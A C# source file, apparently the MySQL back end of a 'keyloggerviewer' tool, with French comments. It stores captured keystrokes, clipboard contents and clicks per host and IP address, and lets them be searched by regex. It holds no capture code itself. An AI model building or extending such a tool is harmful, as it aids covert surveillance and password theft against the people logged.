﻿using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using MySql.Data.MySqlClient;


namespace keyloggerviewer
{
    public class DbLink
    {
        // Classe gérant la connexion mysql qui est un singleton pour ne pas avoir plusieurs connexion en parallèle. 
        // Ce n'est pas essentiel dans notre cas, mais cela evite des erreurs.
        private MySqlConnection connection;
        private static DbLink link=null;

        
        public static DbLink  getInstance(string server, string user, string password, string port, string dbName = "")
        {
            // permet de récupérer une connexion sql ou de la créer si ce n'est pas encore le cas.
            if (link == null)
            {
                link = new DbLink(server, user, password, port, dbName);
            }

            return link;
        }
        
        public static DbLink  createInstance(string server, string user, string password, string port, string dbName)
        {
            // permet de créer une connexion sql en initialisant la base de donnée
            if (link == null)
            {
                link = new DbLink(server, user, password, port);
                if (link.createDb(dbName))
                {
                    link = null;
                    link = new DbLink(server, user, password, port, dbName);
                    link.createTable();
                }
                else
                {
                    link = null;
                }
                
            }

            return link;
        }

        public void createTable()
        {
            string s0 = @"CREATE TABLE `host` (
                `hostId` int(11) NOT NULL,
                `hostName` varchar(50) NOT NULL,
                `hostPrivateIp` varchar(15) DEFAULT NULL,
                `hostPublicIp` varchar(15) DEFAULT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `log` (
  `hostId` int(20) NOT NULL,
  `logId` int(11) NOT NULL,
  `logType` set('text','copy','paste','click','shortcut','keypress') NOT NULL,
  `logDate` date NOT NULL DEFAULT current_timestamp(),
  `content` text DEFAULT NULL,
  `logTime` time DEFAULT NULL,
  `application` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;ALTER TABLE `host`
  ADD PRIMARY KEY (`hostId`);ALTER TABLE `log`
  ADD PRIMARY KEY (`logId`,`hostId`),
  ADD KEY `host` (`hostId`);ALTER TABLE `host`
  MODIFY `hostId` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;ALTER TABLE `log`
  ADD CONSTRAINT `host` FOREIGN KEY (`hostId`) REFERENCES `host` (`hostId`);
COMMIT;";
            connection.Open();
            MySqlCommand cmd = new MySqlCommand(s0, connection);
            cmd.ExecuteNonQuery();
        }


        public bool createDb(string dbName)
        {
            string s0 = "CREATE DATABASE `" + dbName + "`;";
            connection.Open();
            MySqlCommand cmd = new MySqlCommand(s0, connection);
            bool result = true;
            try
            {
                cmd.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                result = false;
            }

            connection.Close();
            return result;
        }
        
        private DbLink(string server, string user, string password, string port, string dbName="")
        {
            string connStr;
            if (dbName != "")
                connStr = "server=" + server + ";user=" + user + ";database=" + dbName + ";port=" + port + ";password=" + password;
            else
            {
                connStr = "server=" + server + ";user=" + user + ";port=" + port + ";password=" + password;
            }
            this.connection = new MySqlConnection(connStr);
            this.connection.Open();
            this.connection.Close();
        }

        public List<LogData> getData(string hostName = "", string hostPublicIp = "", string hostPrivateIp = "",
            string type = "", int contentMaxLen = 1000, int contentMinLen = 0, string regex = "", int lineBefore = 0,
            int lineAfter = 0, string startDate = "", string endDate = "", string startTime = "", string endTime = "")
        // Fonction permettant de selectionner seulement certaines données selon différent critère.
        {
            List<LogData> logList = new List<LogData>();
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }
            // On crée la requête sql et on ajoute tous les paramètres nécessaires.
            string sqlReq = @"SELECT l.hostId, l.logId 
            FROM host as h JOIN log as l ON h.hostId = l.hostId
            WHERE (@hostname = '' OR h.hostName = @hostname) 
            AND (@publicip = '' OR h.hostPublicIp = @publicip)
            AND (@privateip = '' OR h.hostPrivateIp = @privateip)
            AND (@type = '' OR l.logType = @type)
            AND (@contentmaxlen = 0 OR l.content IS NULL OR CHAR_LENGTH(l.content) < @contentmaxlen)
            AND (@contentminlen = 0 OR l.content IS NULL OR CHAR_LENGTH (l.content) > @contentminlen)
            AND (@regex = '' OR l.content IS NULL OR l.content REGEXP @regex)
            AND (@startTime = '' OR l.logTime >= @startTime)
            AND (@endTime = '' OR l.logTime <= @endTime)
            AND (@startDate = '' OR l.logDate >= @startDate)
            AND (@endDate = '' OR l.logDate <= @endDate)";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            req.Parameters.AddWithValue("@hostname", hostName);
            req.Parameters.AddWithValue("@publicip", hostPublicIp);
            req.Parameters.AddWithValue("@privateip", hostPrivateIp);
            req.Parameters.AddWithValue("@type", type);
            req.Parameters.AddWithValue("@contentmaxlen", contentMaxLen);
            req.Parameters.AddWithValue("@contentminlen", contentMinLen);
            req.Parameters.AddWithValue("@startTime", startTime);
            req.Parameters.AddWithValue("@endTime", endTime);
            req.Parameters.AddWithValue("@startDate", startDate);
            req.Parameters.AddWithValue("@endDate", endDate);
            req.Parameters.AddWithValue("@regex", regex);
            MySqlDataReader rdr = req.ExecuteReader();
            List<int[]> idCombo = new List<int[]>();
            while (rdr.Read())
            {
                int[] a = {int.Parse(rdr[0].ToString()), int.Parse(rdr[1].ToString())};
                idCombo.Add(a);
            }

            rdr.Close();
            // Seconde requête qui permet pour chaque ligne sélectionnée le nombre de lignes avant et après demandées.
            foreach (int[] i in idCombo)
            {
                sqlReq =
                    @"SELECT h.hostName, l.application, h.hostPublicIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
                            FROM host as h JOIN log as l ON h.hostId = l.hostId
                            WHERE (l.logId <= @maxLog) AND (l.logId >= @minLog) AND (l.hostId=@hostId)";
                
                req = new MySqlCommand(sqlReq, connection);
                req.Parameters.AddWithValue("@hostId", i[0]);
                req.Parameters.AddWithValue("@minLog", i[1] - lineBefore);
                req.Parameters.AddWithValue("@maxLog", i[1] + lineAfter);
                MySqlDataReader rdr2 = req.ExecuteReader();
                while (rdr2.Read())
                {
                    logList.Add(new LogData(rdr2[0].ToString(), rdr2[1].ToString(), rdr2[2].ToString(),
                        DateTime.Parse(rdr2[3].ToString()), rdr2[4].ToString(), rdr2[5].ToString(),
                        int.Parse(rdr2[6].ToString())));

                }

                rdr2.Close();
            }

            connection.Close();

            return logList;
        }

        public List<String> getHostList()
        {
            // Fonction permettant de récupérer la liste des hotes présent sur la base de donnée.
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }

            string sqlReq = @"SELECT DISTINCT hostName FROM host";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            MySqlDataReader rdr = req.ExecuteReader();
            List<string> names = new List<string>();
            while (rdr.Read())
            {
                names.Add(rdr[0].ToString());
            }

            rdr.Close();
            return names;
        }


        public int getHostId(Host h)
        {
            // Fonction permettant de récupérer l'id myql d'un hote et de l'ajouter à la base de donnée si il n'est pas déjà présent.
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }

            string sqlReq = @"SELECT hostId FROM host WHERE hostName = @hostName AND hostPublicIp = @publicIp";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            req.Parameters.AddWithValue("@hostName", h.HostName);
            req.Parameters.AddWithValue("@publicIp", h.PublicIp);
            MySqlDataReader rdr = req.ExecuteReader();
            if (rdr.HasRows)
            {
                Console.WriteLine("coucou");
                int id = 0;
                while (rdr.Read())
                {
                    id = int.Parse(rdr[0].ToString());
                }

                rdr.Close();
                h.SqlId = id;
            }
            else
            {
                rdr.Close();
                Console.WriteLine("create");
                sqlReq = @"INSERT INTO `host` (`hostName`, `hostPublicIp`) VALUES (@hostName, @publicIp);";
                req = new MySqlCommand(sqlReq, connection);
                req.Parameters.AddWithValue("@hostName", h.HostName);
                req.Parameters.AddWithValue("@publicIp", h.PublicIp);
                Console.WriteLine("TTOTOO");
                int c = req.ExecuteNonQuery();
                Console.WriteLine("aze");
                Console.WriteLine(c);
                sqlReq = @"SELECT hostId FROM host WHERE hostName = @hostName AND hostPublicIp = @publicIp";
                req = new MySqlCommand(sqlReq, connection);
                req.Parameters.AddWithValue("@hostName", h.HostName);
                req.Parameters.AddWithValue("@publicIp", h.PublicIp);
                rdr = req.ExecuteReader();
                int id = 0;
                while (rdr.Read())
                {
                    id = int.Parse(rdr[0].ToString());
                }

                rdr.Close();
                h.SqlId = id;
            }

            connection.Close();
            return h.SqlId;
        }
        
        public DateTime getLastLogTime(Host h)
        {
            // Permet d'obtenir la date et l'heure de dernier log pour un hote donné.
            if (h.SqlId == -1)
            {
                h.SqlId = getHostId(h);
            }
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }
            string sqlReq =
                @"SELECT logId, TIMESTAMP(logDate, logTime) FROM log WHERE hostId = @hostId AND logId = (SELECT MAX(logId) FROM log WHERE hostId = @hostId);";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            req.Parameters.AddWithValue("@hostId", h.SqlId);
            MySqlDataReader rdr = req.ExecuteReader();
            int lastId = 0;
            DateTime lastTime = DateTime.Parse("1/1/1900");
            if (rdr.HasRows)
            {

                while (rdr.Read())
                {
                    lastId = int.Parse(rdr[0].ToString());
                    lastTime = DateTime.Parse(rdr[1].ToString());
                }
            }
            rdr.Close();
            connection.Close();
            return lastTime;
        }
        
        public int getLastLogId(Host h)
        {
            // Permet de récupérer l'id du dernier log pour un hote donné.
            if (h.SqlId == -1)
            {
                h.SqlId = getHostId(h);
            }
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }

            string sqlReq =
                @"SELECT logId, TIMESTAMP(logDate, logTime) FROM log WHERE hostId = @hostId AND logId = (SELECT MAX(logId) FROM log WHERE hostId = @hostId);";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            req.Parameters.AddWithValue("@hostId", h.SqlId);
            MySqlDataReader rdr = req.ExecuteReader();
            int lastId = 0;
            DateTime lastTime = DateTime.Parse("1/1/1900");
            if (rdr.HasRows)
            {

                while (rdr.Read())
                {
                    lastId = int.Parse(rdr[0].ToString());
                    lastTime = DateTime.Parse(rdr[1].ToString());
                }
            }
            rdr.Close();
            connection.Close();
            return lastId;
        }
        
        public int insertLogData(Host h)
        {
            // Insère dans la base de donnée un hote avec l'intégralité des logs associés.
            if (h.SqlId == -1)
            {
                h.SqlId = getHostId(h);
            }
            int lastId = getLastLogId(h);
            foreach (Log log in h.LogList)
            {
                lastId += 1;
                log.LogId = lastId;
            }
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }

            string sqlReq =
                "INSERT INTO log (hostId, logId, logType, logDate, logTime, content, application) VALUES (@hostId, @logId, @logType, @logDate, @logTime, @content, @application)";
            MySqlCommand req = new MySqlCommand(sqlReq, connection);
            req.Parameters.Add("@hostId", MySqlDbType.Int32);
            req.Parameters.Add("@logId", MySqlDbType.Int32);
            req.Parameters.Add("@logType", MySqlDbType.String);
            req.Parameters.Add("@logDate", MySqlDbType.DateTime);
            req.Parameters.Add("@logTime", MySqlDbType.DateTime);
            req.Parameters.Add("@content", MySqlDbType.String);
            req.Parameters.Add("@application", MySqlDbType.String);
            foreach (Log log in h.LogList)
            {
                req.Parameters["@hostId"].Value = log.HostId;
                req.Parameters["@logId"].Value = log.LogId;
                req.Parameters["@logType"].Value = log.LogType;
                req.Parameters["@logDate"].Value = log.LogDate;
                req.Parameters["@logTime"].Value = log.LogTime;
                req.Parameters["@content"].Value = log.LogContent;
                req.Parameters["@application"].Value = log.LogApp;
                req.ExecuteNonQuery();
            }
            
            connection.Close();
            return 1;
        }

        public void deleteLog(List<LogData> logs)
        {
            Console.WriteLine("totot");
            Dictionary<string, List<int>> del = new Dictionary<string, List<int>>();
            foreach (LogData log in logs)
            {
                if (!del.ContainsKey(log.HostName))
                {
                    del.Add(log.HostName, new List<int>());
                    del[log.HostName].Add(log.LogId);
                }
                else
                {
                    del[log.HostName].Add(log.LogId);
                }
            }
            
            if (connection.State != ConnectionState.Open)
            {
                connection.Open();
            }

            MySqlCommand req;
            string sqlReq;
            string idLog;
            foreach (string name in del.Keys)
            {
                Console.WriteLine(string.Join(",", del[name]));
                Console.WriteLine(name);
                idLog = "(" + string.Join(",", del[name]) + ")";
                sqlReq =
                    @"DELETE FROM log WHERE logId in " + idLog + @"AND hostId = (SELECT hostId FROM host WHERE hostName=@name);";
                req = new MySqlCommand(sqlReq, connection);
                req.Parameters.AddWithValue("@name", name);
                req.ExecuteNonQuery();
            }
            connection.Close();
            
        }
    }
}